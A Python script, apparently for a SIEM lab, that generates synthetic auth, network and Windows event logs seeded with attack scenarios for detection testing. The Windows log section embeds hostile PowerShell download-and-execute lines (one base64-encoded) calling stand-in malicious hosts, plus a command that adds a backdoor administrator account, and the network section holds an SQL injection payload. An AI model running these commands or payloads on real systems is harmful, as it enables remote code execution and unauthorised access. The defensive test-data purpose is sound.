#!/usr/bin/env python3

import os
import json
from datetime import datetime, timedelta
import random

# Directory to save the sample data
output_dir = "/home/ubuntu/elastic-stack-siem/data-pipeline/sample_data"
os.makedirs(output_dir, exist_ok=True)

# Generate sample authentication logs
def generate_auth_logs(num_entries=100):
    logs = []
    timestamp = datetime.now() - timedelta(days=1)
    
    usernames = ["admin", "root", "user1", "developer", "jenkins", "ubuntu", "ec2-user"]
    source_ips = [
        "192.168.1." + str(i) for i in range(1, 20)
    ] + [
        "10.0.0." + str(i) for i in range(1, 10)
    ] + [
        "203.0.113." + str(i) for i in range(1, 5)
    ]
    
    # Add some suspicious IPs for the scenario
    suspicious_ips = ["45.227.253.83", "185.176.27.132", "103.43.12.106", "91.240.118.168"]
    source_ips.extend(suspicious_ips)
    
    for i in range(num_entries):
        username = random.choice(usernames)
        source_ip = random.choice(source_ips)
        
        # Create more failed attempts from suspicious IPs
        if source_ip in suspicious_ips and random.random() < 0.8:
            status = "Failed"
        else:
            status = random.choices(["Success", "Failed"], weights=[0.7, 0.3])[0]
        
        # Create a cluster of failed attempts for brute force scenario
        if i > 50 and i < 70 and source_ip == suspicious_ips[0]:
            status = "Failed"
            username = "admin"  # Target the admin account
        
        timestamp += timedelta(seconds=random.randint(30, 300))
        
        log_entry = {
            "@timestamp": timestamp.isoformat(),
            "event": {
                "module": "system",
                "dataset": "auth",
                "action": f"authentication_{status.lower()}"
            },
            "user": {
                "name": username
            },
            "source": {
                "ip": source_ip
            },
            "message": f"{status} password for {username} from {source_ip} port {random.randint(30000, 65000)}",
            "tags": [f"authentication_{status.lower()}"]
        }
        
        logs.append(log_entry)
    
    with open(os.path.join(output_dir, "auth_logs.json"), "w") as f:
        json.dump(logs, f, indent=2)
    
    print(f"Generated {num_entries} authentication log entries")

# Generate sample network traffic data
def generate_network_data(num_entries=100):
    logs = []
    timestamp = datetime.now() - timedelta(days=1)
    
    protocols = ["http", "dns", "tls", "ssh", "smtp"]
    internal_ips = ["192.168.1." + str(i) for i in range(1, 20)]
    external_ips = [
        "203.0.113." + str(i) for i in range(1, 10)
    ] + [
        "198.51.100." + str(i) for i in range(1, 10)
    ] + [
        "8.8.8.8",
        "1.1.1.1"
    ]
    
    # Add some suspicious IPs/domains for the scenario
    suspicious_domains = ["malware-delivery.example.com", "c2-server.example.net", "data-exfil.example.org"]
    suspicious_ips = ["45.227.253.83", "185.176.27.132", "103.43.12.106"]
    
    for i in range(num_entries):
        source_ip = random.choice(internal_ips)
        
        # Create some suspicious traffic for scenarios
        if i > 60 and i < 80:
            protocol = "http"
            destination_ip = random.choice(suspicious_ips)
            destination_domain = random.choice(suspicious_domains)
            bytes_out = random.randint(1000000, 10000000)  # Large outbound for data exfil
        else:
            protocol = random.choice(protocols)
            destination_ip = random.choice(external_ips)
            destination_domain = f"server-{random.randint(1, 100)}.example.com"
            bytes_out = random.randint(1000, 100000)
        
        bytes_in = random.randint(1000, 50000)
        
        timestamp += timedelta(seconds=random.randint(5, 60))
        
        log_entry = {
            "@timestamp": timestamp.isoformat(),
            "network": {
                "protocol": protocol,
                "bytes": bytes_in + bytes_out,
                "bytes_in": bytes_in,
                "bytes_out": bytes_out
            },
            "source": {
                "ip": source_ip,
                "port": random.randint(30000, 65000)
            },
            "destination": {
                "ip": destination_ip,
                "port": 443 if protocol == "tls" else (53 if protocol == "dns" else 80),
                "domain": destination_domain
            },
            "event": {
                "module": "network",
                "dataset": protocol,
                "action": "connection"
            }
        }
        
        # Add HTTP specific fields
        if protocol == "http":
            log_entry["http"] = {
                "request": {
                    "method": random.choice(["GET", "POST", "PUT"]),
                    "body": ""
                },
                "response": {
                    "status_code": random.choice([200, 200, 200, 404, 403, 500])
                }
            }
            
            # Add suspicious payload for SQL injection scenario
            if destination_ip in suspicious_ips and random.random() < 0.7:
                log_entry["http"]["request"]["body"] = "username=admin' OR 1=1--&password=anything"
                log_entry["tags"] = ["potential_sql_injection", "attack"]
        
        # Add DNS specific fields
        if protocol == "dns":
            log_entry["dns"] = {
                "question": {
                    "name": destination_domain,
                    "type": random.choice(["A", "AAAA", "MX", "TXT"])
                }
            }
            
            # Add suspicious long DNS query for DNS tunneling scenario
            if destination_ip in suspicious_ips and random.random() < 0.7:
                encoded_data = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=40))
                log_entry["dns"]["question"]["name"] = f"{encoded_data}.exfil.example.com"
                log_entry["tags"] = ["potential_dns_tunneling", "attack"]
        
        logs.append(log_entry)
    
    with open(os.path.join(output_dir, "network_data.json"), "w") as f:
        json.dump(logs, f, indent=2)
    
    print(f"Generated {num_entries} network traffic entries")

# Generate sample Windows event logs
def generate_windows_logs(num_entries=100):
    logs = []
    timestamp = datetime.now() - timedelta(days=1)
    
    event_codes = {
        "4624": "User logon",
        "4625": "Logon failure",
        "4720": "User account created",
        "4732": "User added to security-enabled local group",
        "4104": "PowerShell script block logging"
    }
    
    usernames = ["Administrator", "SYSTEM", "john.doe", "jane.smith", "helpdesk", "backup"]
    workstations = ["WIN-CLIENT01", "WIN-CLIENT02", "WIN-SERVER01", "DESKTOP-ABC123"]
    
    # Suspicious PowerShell commands for the scenario
    suspicious_commands = [
        "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')",
        "powershell.exe -NoP -NonI -W Hidden -Enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkA",
        "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add",
        "Get-WmiObject Win32_Process | Where-Object {$_.Name -eq 'lsass.exe'} | ForEach-Object {$_.GetOwner()}"
    ]
    
    for i in range(num_entries):
        event_code = random.choice(list(event_codes.keys()))
        username = random.choice(usernames)
        workstation = random.choice(workstations)
        
        timestamp += timedelta(seconds=random.randint(30, 300))
        
        log_entry = {
            "@timestamp": timestamp.isoformat(),
            "event": {
                "code": event_code,
                "provider": "Microsoft-Windows-Security-Auditing" if event_code != "4104" else "Microsoft-Windows-PowerShell",
                "action": event_codes[event_code]
            },
            "user": {
                "name": username
            },
            "host": {
                "name": workstation
            },
            "winlog": {
                "event_id": int(event_code),
                "provider_name": "Microsoft-Windows-Security-Auditing" if event_code != "4104" else "Microsoft-Windows-PowerShell"
            }
        }
        
        # Add specific fields based on event type
        if event_code == "4624" or event_code == "4625":
            log_entry["winlog"]["logon"] = {
                "type": random.randint(2, 10),
                "failure_reason": "Unknown username or bad password" if event_code == "4625" else None
            }
            
            if event_code == "4625":
                log_entry["tags"] = ["logon_failure"]
            else:
                log_entry["tags"] = ["user_logon"]
        
        elif event_code == "4720":
            log_entry["winlog"]["event_data"] = {
                "TargetUserName": f"new.user{random.randint(1, 100)}",
                "SubjectUserName": username
            }
            log_entry["tags"] = ["user_created"]
        
        elif event_code == "4732":
            log_entry["winlog"]["event_data"] = {
                "TargetUserName": f"user{random.randint(1, 100)}",
                "SubjectUserName": username,
                "TargetGroupName": "Administrators"
            }
            log_entry["tags"] = ["user_added_to_group"]
        
        elif event_code == "4104":
            # Add suspicious PowerShell commands for the scenario
            if i > 40 and i < 50:
                log_entry["event"]["message"] = random.choice(suspicious_commands)
                log_entry["tags"] = ["powershell_script", "suspicious_powershell", "attack"]
            else:
                log_entry["event"]["message"] = f"Write-Host 'Normal PowerShell activity from {username}'"
                log_entry["tags"] = ["powershell_script"]
        
        logs.append(log_entry)
    
    with open(os.path.join(output_dir, "windows_logs.json"), "w") as f:
        json.dump(logs, f, indent=2)
    
    print(f"Generated {num_entries} Windows event log entries")

# Generate all sample data
def generate_all_sample_data():
    generate_auth_logs(200)
    generate_network_data(200)
    generate_windows_logs(200)
    print(f"All sample data generated in {output_dir}")

if __name__ == "__main__":
    generate_all_sample_data()

